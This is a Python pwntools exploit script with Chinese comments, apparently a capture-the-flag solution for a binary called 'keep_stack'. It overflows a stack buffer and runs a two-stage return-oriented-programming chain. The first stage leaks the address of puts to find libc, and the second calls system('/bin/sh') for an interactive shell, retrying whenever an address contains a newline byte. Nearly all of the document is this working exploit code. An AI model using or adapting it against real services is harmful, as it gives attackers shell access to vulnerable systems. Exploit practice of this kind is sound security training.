#!/usr/bin/env python3
from pwn import *

context.arch = “amd64”
context.os = “linux”
context.log_level = “debug”

elf = ELF(“./keep_stack”, checksec=False)
libc = ELF(“./libc.so.6”, checksec=False)

本地

def start_local():
return process([“./ld-linux-x86-64.so.2”, “./keep_stack”], env={“LD_PRELOAD”: “./libc.so.6”})

远程

def start():
return start_local()
# return remote(“host”, 12345)

OFFSET = 0xA8
POP_RDI_RET = 0x4011E1
RET = 0x4011E2
PUTS_PLT = 0x401090
PUTS_GOT = 0x404120
VULN = 0x4016C8

def send_stage(io, payload, length_words=0x80):
# length 是“索引上限”，需要足够大才能覆盖 RIP
# 0x80 对应最多写到 0x100 偏移，足够覆盖 0xA8
assert len(payload) % 2 == 0
assert b”\n” not in payload, “payload 含 0x0a 会被提前截断”

io.recvuntil(b"length: ")
io.sendline(str(length_words).encode())

io.recvuntil(b"What do you want to say? ")
io.send(payload + b"\n")

def p64n(x):
return p64(x)

while True:
io = start()

# ---------------- stage 1: leak puts ----------------
rop1 = flat(
    b"A" * OFFSET,
    p64n(POP_RDI_RET),
    p64n(PUTS_GOT),
    p64n(PUTS_PLT),
    p64n(VULN),
)

# 避免换行截断
if b"\n" in rop1:
    io.close()
    continue

send_stage(io, rop1)

# 吃掉 input 回显行
io.recvuntil(b"input: ")
io.recvline()

# puts 泄漏行
leak_line = io.recvline().rstrip(b"\n")
leak = u64(leak_line.ljust(8, b"\x00"))
log.success(f"leaked puts = {hex(leak)}")

libc.address = leak - libc.sym["puts"]
system_addr = libc.sym["system"]
binsh_addr = next(libc.search(b"/bin/sh\x00"))

log.success(f"libc base = {hex(libc.address)}")
log.success(f"system    = {hex(system_addr)}")
log.success(f"/bin/sh   = {hex(binsh_addr)}")

# ---------------- stage 2: system('/bin/sh') ----------------
rop2 = flat(
    b"B" * OFFSET,
    p64n(RET),            # 栈对齐（可选但建议）
    p64n(POP_RDI_RET),
    p64n(binsh_addr),
    p64n(system_addr),
)

# 如果地址里出现 0x0a，会被这题输入逻辑截断；重开一把即可
if b"\n" in rop2:
    log.warning("stage2 payload has 0x0a, retrying...")
    io.close()
    continue

send_stage(io, rop2)
io.interactive()
break
